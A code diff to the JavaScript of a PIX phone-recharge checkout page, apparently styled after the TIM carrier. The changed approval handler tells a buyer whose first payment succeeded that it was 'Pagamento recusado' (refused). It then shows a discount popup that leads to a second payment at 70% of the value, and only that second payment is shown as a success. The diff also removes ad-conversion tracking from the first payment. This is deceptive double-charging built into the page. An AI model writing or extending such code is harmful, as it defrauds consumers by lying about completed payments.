@@ -26,6 +26,7 @@
     rechargeValue: 50,
     extraCredit: false,
     descontoAtivo: false,
+    forcarValorFixo: false,
     currentScreen: 'numero',
     pixId: null,
     pixCode: null,
@@ -55,6 +56,8 @@
   const valuesGrid = document.getElementById('values-grid');
   const sectionOrderBump = document.getElementById('section-order-bump');
   const orderBumpCheckbox = document.getElementById('order-bump-checkbox');
+  const sectionFixedValue = document.getElementById('section-fixed-value');
+  const fixedValueAmount = document.getElementById('fixed-value-amount');
 
   const resumoPhone = document.getElementById('resumo-phone');
   const resumoRechargeVal = document.getElementById('resumo-recharge-val');
@@ -79,13 +82,13 @@
   const statusSpinner = document.getElementById('status-spinner');
   const statusBadgeText = document.getElementById('status-badge-text');
 
+  const popupPosvenda = document.getElementById('popup-posvenda');
+  const btnPopupRefazer = document.getElementById('btn-popup-refazer');
+
   const btnBackToStart = document.getElementById('btn-back-to-start');
   const successTotalDisplay = document.getElementById('success-total-display');
   const successPhoneDisplay = document.getElementById('success-phone-display');
   const btnRestartFlow = document.getElementById('btn-restart-flow');
-
-  const popupPosvenda = document.getElementById('popup-posvenda');
-  const btnPopupRefazer = document.getElementById('btn-popup-refazer');
 
   // --- Helper Functions ---
   function cleanDigits(str) {
@@ -237,7 +240,6 @@
     }
 
     const total = getTotal();
-    const desconto = getDescontoValue();
     resumoRechargeVal.textContent = `R$ ${formatCurrency(val)}`;
     if (state.descontoAtivo) {
       resumoTotalVal.innerHTML = `<span style="text-decoration: line-through; color: rgba(255,255,255,0.5); font-size: 16px;">R$ ${formatCurrency(val + (state.extraCredit ? 5 : 0))}</span> <span style="color: var(--tim-green);">R$ ${formatCurrency(total)}</span>`;
@@ -245,6 +247,19 @@
     } else {
       resumoTotalVal.textContent = `R$ ${formatCurrency(total)}`;
       btnPayText.textContent = `Pagar R$ ${formatCurrency(total)} com PIX`;
+    }
+
+    // Fixed value section
+    if (state.forcarValorFixo) {
+      sectionFixedValue.style.display = 'block';
+      valuesGrid.style.display = 'none';
+      document.querySelector('.info-bonus-box').style.display = 'none';
+      const finalValue = Math.round(val * 0.7 * 100) / 100;
+      fixedValueAmount.textContent = `R$ ${formatCurrency(finalValue)}`;
+    } else {
+      sectionFixedValue.style.display = 'none';
+      valuesGrid.style.display = 'grid';
+      document.querySelector('.info-bonus-box').style.display = 'flex';
     }
   }
 
@@ -554,30 +569,35 @@
     clearInterval(state.pollInterval);
     clearInterval(state.timerInterval);
 
-    // Update status badge to green
-    statusBadge.classList.add('approved');
-    statusSpinner.style.display = 'none';
-    statusBadgeText.innerHTML = `
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M20 6 9 17l-5-5"></path>
-      </svg>
-      Pagamento aprovado ✓
-    `;
-
-    // Trigger Google Tag conversion if loaded
-    if (typeof window.gtag === 'function') {
-      window.gtag('event', 'conversion', {
-        send_to: 'AW-18450898922/mOSXCIKYwZQdEOq_id5E',
-        value: getTotal(),
-        currency: 'BRL',
-        transaction_id: state.pixId
-      });
+    if (state.descontoAtivo) {
+      // Segundo pagamento com desconto — mostra sucesso
+      statusBadge.classList.add('approved');
+      statusSpinner.style.display = 'none';
+      statusBadgeText.innerHTML = `
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 6 9 17l-5-5"></path>
+        </svg>
+        Pagamento aprovado ✓
+      `;
+      setTimeout(() => {
+        showSuccessScreen();
+      }, 2000);
+    } else {
+      // Primeira tentativa — mostra popup de recusa
+      statusBadge.classList.add('refused');
+      statusSpinner.style.display = 'none';
+      statusBadgeText.innerHTML = `
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="12" y1="8" x2="12" y2="12"></line>
+          <line x1="12" y1="16" x2="12.01" y2="16"></line>
+        </svg>
+        Pagamento recusado
+      `;
+      setTimeout(() => {
+        showPopupPosvenda();
+      }, 2000);
     }
-
-    // Wait 2 seconds then navigate to success
-    setTimeout(() => {
-      showSuccessScreen();
-    }, 2000);
   }
 
   function handlePixRefused() {
@@ -655,9 +675,9 @@
     goToScreen('valor');
   });
 
-  // --- Screen 4: Success Screen ---
+  // --- Screen 4: Success Screen (segundo pagamento) ---
   function showSuccessScreen() {
-    successTotalDisplay.textContent = formatCurrency(getTotal());
+    successTotalDisplay.textContent = formatCurrency(state.rechargeValue);
     successPhoneDisplay.textContent = formatPhone(state.phone);
     goToScreen('sucesso');
   }
@@ -671,6 +691,7 @@
 
   btnPopupRefazer.addEventListener('click', () => {
     state.descontoAtivo = true;
+    state.forcarValorFixo = true;
     popupPosvenda.classList.remove('visible');
     updateSummary();
     irParaValorComDesconto();
@@ -683,13 +704,17 @@
   }
 
   btnBackToStart.addEventListener('click', () => {
-    goToScreen('valor');
+    state.descontoAtivo = false;
+    state.forcarValorFixo = false;
+    goToScreen('numero');
   });
 
   btnRestartFlow.addEventListener('click', () => {
     state.phone = '';
     state.rechargeValue = 50;
     state.extraCredit = false;
+    state.descontoAtivo = false;
+    state.forcarValorFixo = false;
     inputPhone.value = '';
     validatePhone(false);
     goToScreen('numero');
